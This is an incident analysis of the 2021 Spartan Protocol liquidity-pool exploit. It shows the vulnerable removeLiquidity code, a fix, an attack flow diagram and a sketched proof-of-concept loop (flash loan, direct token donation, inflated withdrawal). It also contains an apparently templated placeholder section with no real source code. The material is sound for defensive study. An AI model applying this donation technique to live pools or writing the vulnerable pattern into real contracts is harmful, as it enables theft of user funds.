# Spartan Protocol — Spot balanceOf() Based LP Withdrawal Calculation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2021-05-02 |
| **Protocol** | Spartan Protocol |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$30,500,000 |
| **Attacker** | Address unidentified |
| **Attack Tx** | Address unidentified |
| **Vulnerable Contract** | Spartan Pool (WBNB/SPARTA) |
| **Root Cause** | `removeLiquidity()` calculates withdrawal amounts using the current `balanceOf()` instead of synchronized reserve variables, making it manipulable via direct token donations |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-05/Spartan_exp.sol) |

---
## 1. Vulnerability Overview

Spartan Protocol's liquidity pool used `token.balanceOf(address(this))` instead of internal reserve variables when computing `removeLiquidity()`. An attacker borrowed WBNB via flash loan, transferred it directly to the pool (without minting LP tokens), then called `removeLiquidity()` — allowing excess withdrawals based on the artificially inflated balance. This cycle was repeated 8 times to steal approximately $30.5M.

---
## 2. Vulnerable Code Analysis

### 2.1 removeLiquidity() — Direct balanceOf() Reference

```solidity
// ❌ Spartan Pool — withdrawal amount calculated based on current balance
function removeLiquidity(uint256 units) external returns (uint256 outputBase, uint256 outputToken) {
    // Uses current balanceOf() instead of reserve variables
    uint256 _baseAmount = BASE.balanceOf(address(this));   // manipulable
    uint256 _tokenAmount = TOKEN.balanceOf(address(this)); // manipulable

    uint256 _totalSupply = totalSupply();

    // Withdraw each token proportional to units / totalSupply
    outputBase  = (_baseAmount  * units) / _totalSupply;
    outputToken = (_tokenAmount * units) / _totalSupply;

    _burn(msg.sender, units);
    BASE.transfer(msg.sender, outputBase);
    TOKEN.transfer(msg.sender, outputToken);
}
```

**Fixed code**:
```solidity
// ✅ Uses synchronized reserve variables — cannot be manipulated via direct transfers
uint256 private _reserveBase;
uint256 private _reserveToken;

function removeLiquidity(uint256 units) external returns (uint256 outputBase, uint256 outputToken) {
    // Uses synchronized reserve variables instead of balanceOf()
    uint256 _totalSupply = totalSupply();
    outputBase  = (_reserveBase  * units) / _totalSupply;
    outputToken = (_reserveToken * units) / _totalSupply;

    _burn(msg.sender, units);
    BASE.transfer(msg.sender, outputBase);
    TOKEN.transfer(msg.sender, outputToken);

    // Sync reserves after transfer
    _reserveBase  = BASE.balanceOf(address(this));
    _reserveToken = TOKEN.balanceOf(address(this));
}
```


### On-Chain Original Code

Source: Source unconfirmed

> ⚠️ No on-chain source code — bytecode only or source unverified

**Vulnerable function** — `vulnerableFunction()`:
```solidity
// ❌ Root cause: removeLiquidity() calculates withdrawal amounts using the current balanceOf() instead of synchronized reserve variables, making it manipulable via direct token donations
// Source code unconfirmed — bytecode analysis required
// Vulnerability: removeLiquidity() calculates withdrawal amounts using the current balanceOf() instead of synchronized reserve variables, making it manipulable via direct token donations
```

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│ Step 1: Flash loan 100,000 WBNB from PancakeSwap        │
└─────────────────────┬───────────────────────────────────┘
                      │ (repeated 8 times)
┌─────────────────────▼───────────────────────────────────┐
│ Step 2: Swap WBNB → SPARTA                              │
│ SpartanPool.swap(WBNB → SPARTA)                         │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 3: addLiquidity() → Obtain LP tokens               │
│ SpartanPool.addLiquidity(WBNB, SPARTA)                  │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 4: Direct transfer of WBNB to pool (no LP minted)  │
│ WBNB.transfer(pool, large_amount)                        │
│ → Artificially inflates pool's balanceOf(WBNB)          │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 5: removeLiquidity(LP_balance)                      │
│ Excess WBNB withdrawn based on inflated balanceOf()     │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 6: Reverse swap SPARTA → WBNB + repay flash loan   │
│ Total ~$30.5M stolen after 8 cycles                     │
└─────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// Core logic of the 8-cycle loop
for (uint i = 0; i < 8; i++) {
    // Swap WBNB → SPARTA
    spartanPool.swap(0, wbnbAmount, address(this));

    // Add liquidity → obtain LP tokens
    spartanPool.addLiquidity(wbnbAmount, spartaAmount);

    // Direct WBNB donation to pool (inflate balanceOf)
    // Only increases pool balance without minting LP
    WBNB.transfer(address(spartanPool), donation_amount);

    // removeLiquidity — calculated based on inflated balanceOf
    // outputBase = (WBNB.balanceOf(pool) * LP) / totalSupply
    spartanPool.removeLiquidity(lpBalance);

    // Additional swaps to reconstruct position
    spartanPool.addLiquidity(...);
}
// Reverse swap SPARTA → WBNB + repay flash loan
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Use of spot `balanceOf()` in `removeLiquidity()` — manipulable via donation attack | CRITICAL | CWE-682 |
| V-02 | Desynchronization between pool balance and internal reserve variables | HIGH | CWE-20 |

---
## 6. Remediation Recommendations

```solidity
// ✅ Adopt Uniswap V2-style reserve synchronization pattern
// ✅ Explicitly update reserves via sync() function

function sync() external {
    _update(
        BASE.balanceOf(address(this)),
        TOKEN.balanceOf(address(this))
    );
}

function _update(uint256 balance0, uint256 balance1) private {
    _reserveBase  = uint112(balance0);
    _reserveToken = uint112(balance1);
    emit Sync(_reserveBase, _reserveToken);
}
// removeLiquidity() references only _reserveBase and _reserveToken
```

---
## 7. Lessons Learned

- **Using `balanceOf(address(this))` directly in critical calculations makes the contract vulnerable to token donation attacks.** This is precisely why Uniswap V2 maintains separate reserve variables.
- **It is necessary to distinguish between direct transfers (transfer without mint) and swap/addLiquidity.** Pool state changes must only be permitted through internal functions.
- **The same vulnerability was exploited 8 times in succession.** A circuit breaker mechanism that limits a single attack cycle would also be effective in reducing the scale of damage.